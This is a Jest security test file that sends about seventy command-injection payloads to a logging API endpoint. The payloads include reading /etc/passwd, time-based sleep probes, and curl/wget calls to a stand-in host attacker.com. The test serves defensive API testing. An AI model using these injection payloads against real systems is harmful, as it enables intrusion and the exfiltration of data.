/** @jest-environment node */
import { describe, it, expect } from "@jest/globals";
import request from "supertest";

const baseUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3000/api";
describe("INJ-003: Command Injection (OWASP API3:2023)", () => {
  const payloads = [
    // Standard Linux Command Injection
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "|| cat /etc/passwd",
    "& cat /etc/passwd &",
    "&& cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; ls -la",
    "| ls -la",
    "|| ls -la",
    "& ls -la &",
    "&& ls -la",
    "`ls -la`",
    "$(ls -la)",
    "; ping -c 10 127.0.0.1",
    "| ping -c 10 127.0.0.1",
    "|| ping -c 10 127.0.0.1",
    "& ping -c 10 127.0.0.1 &",
    "&& ping -c 10 127.0.0.1",
    "`ping -c 10 127.0.0.1`",
    "$(ping -c 10 127.0.0.1)",
    "; echo 'injection'",
    "| echo 'injection'",
    "|| echo 'injection'",
    "& echo 'injection' &",
    "&& echo 'injection'",
    "`echo 'injection'`",
    "$(echo 'injection')",

    // Standard Windows Command Injection
    "& dir",
    "&& dir",
    "| dir",
    "|| dir",
    "& ping -n 10 127.0.0.1 &",
    "&& ping -n 10 127.0.0.1",
    "| ping -n 10 127.0.0.1",
    "|| ping -n 10 127.0.0.1",
    "& echo injection",
    "&& echo injection",
    "| echo injection",
    "|| echo injection",

    // Bypassing spaces
    ";cat</etc/passwd",
    "|cat</etc/passwd",
    "||cat</etc/passwd",
    "&cat</etc/passwd&",
    "&&cat</etc/passwd",
    "`cat</etc/passwd`",
    "$(cat</etc/passwd)",

    // Blind Command Injection (Time-based via sleep)
    "; sleep 10",
    "| sleep 10",
    "|| sleep 10",
    "& sleep 10 &",
    "&& sleep 10",
    "`sleep 10`",
    "$(sleep 10)",
    "& timeout /T 10 &",
    "&& timeout /T 10",
    "| timeout /T 10",
    "|| timeout /T 10",

    // Out-of-band / DNS Exfiltration variants
    "; curl http://attacker.com",
    "| curl http://attacker.com",
    "|| curl http://attacker.com",
    "& curl http://attacker.com &",
    "&& curl http://attacker.com",
    "`curl http://attacker.com`",
    "$(curl http://attacker.com)",
    "; wget http://attacker.com",
    "| wget http://attacker.com",
    "|| wget http://attacker.com",
    "& wget http://attacker.com &",
    "&& wget http://attacker.com",
    "`wget http://attacker.com`",
    "$(wget http://attacker.com)"
  ];

  it("should safely interpret and delimit OS command characters passed uniformly", async () => {
    const key = process.env.EXPO_PUBLIC_CLIENT_LOGGER_KEY || "test";

    for (const payload of payloads) {
      const res = await request(baseUrl)
        .post("/logs")
        .set("x-client-logger-key", key)
        .send({
          type: "INFO",
          content: `test ${payload}`,
          message: payload
        });

      // Evaluates safely as a literal string or 403 if key is missing locally
      expect([400, 401, 403, 200]).toContain(res.status);
    }
  }, 30000); // giving extra timeout for loop
});
